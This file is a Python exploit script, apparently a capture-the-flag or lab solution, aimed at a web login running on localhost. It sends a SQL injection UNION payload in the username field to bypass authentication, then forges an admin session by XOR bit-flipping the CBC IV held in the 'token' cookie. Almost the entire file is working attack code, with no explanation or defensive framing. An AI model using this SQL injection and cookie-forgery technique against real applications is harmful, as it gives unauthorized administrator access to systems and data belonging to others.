#!/usr/bin/env python3
import base64, requests
from urllib.parse import unquote
from Crypto.Util.Padding import pad

URL = "http://localhost:8085/"
ENCRYPTED_PASS = "DEi6IlZ9+hc47+0romXKVt8UFmP2PTJ/5NlFrrNyZ+A="
PASSWORD = "password123"
USERNAME_PAYLOAD = f"' UNION SELECT 'admin', '{ENCRYPTED_PASS}' -- "

s = requests.Session()
r = s.post(URL, data={"username": USERNAME_PAYLOAD, "password": PASSWORD}, timeout=8)
print("POST snippet:", r.text[:200])
cookies = s.cookies.get_dict()
print("cookies received raw:", cookies)
phps = cookies.get("PHPSESSID")
id_b64 = unquote(cookies.get("ID"))
token_b64 = unquote(cookies.get("token"))
print("PHPSESSID:", phps)
print("ID (b64):", id_b64)
print("token (b64):", token_b64)

iv = base64.b64decode(token_b64)
print("IV (hex):", iv.hex())
p_guest = pad(b"guest", 16)
p_admin = pad(b"admin", 16)
print("pad(guest) hex:", p_guest.hex())
print("pad(admin) hex:", p_admin.hex())

iv_admin_way1 = bytes(a ^ b ^ c for a,b,c in zip(p_guest, iv, p_admin))
iv_admin_b64 = base64.b64encode(iv_admin_way1).decode()
print("IV_admin (b64):", iv_admin_b64)
print("IV_admin (hex):", iv_admin_way1.hex())

hdr = {"Cookie": f"PHPSESSID={phps}; ID={id_b64}; token={iv_admin_b64}"}
r2 = s.get(URL, headers=hdr, timeout=8)
print("/ GET status:", r2.status_code, "len", len(r2.text))
print("body snippet:", r2.text[:200])